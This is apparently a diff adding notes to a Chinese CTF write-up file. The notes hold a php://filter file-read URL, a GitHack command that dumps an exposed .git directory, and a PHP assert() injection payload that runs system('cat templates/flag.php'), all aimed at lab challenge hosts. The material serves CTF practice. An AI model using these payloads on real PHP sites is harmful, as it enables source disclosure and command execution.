@@ -89,3 +89,15 @@ php伪协议
 ```python
 http://220.249.52.134:41787/?page=php://filter/convert.base64-encode/resource=upload
 ```
+
+### mfw70
+信息泄露
+```python GitHack.py http://220.249.52.134:53570/.git/```
+assert注入
+```assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");```
+payload
+```php
+$file = "') or system('cat templates/flag.php') or strpos('";
+//注入后
+assert("strpos('') or system('cat templates/flag.php') or strpos('', '..') === false") or die("Detected hacking attempt!");
+```
